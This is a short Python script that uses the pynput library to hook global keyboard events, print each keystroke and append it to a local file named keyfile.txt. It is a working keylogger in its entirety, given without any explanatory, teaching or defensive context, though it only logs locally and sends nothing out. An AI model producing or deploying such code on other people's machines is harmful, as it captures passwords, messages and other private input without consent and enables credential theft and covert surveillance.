from pynput import keyboard

def keyPressed(key):
    try:
        print(f'Key {key.char} pressed')
    except AttributeError:
        print(f'Special key {key} pressed')
        with open("keyfile.txt",'a') as logkey:
            logkey.write(f'Special key {key} pressed\n')
    else:
        with open("keyfile.txt",'a') as logkey:
            logkey.write(f'Key {key.char} pressed\n')

    return True



if __name__ == "__main__":
    listener = keyboard.Listener(on_press=keyPressed) # type: ignore
    listener.start()
    input()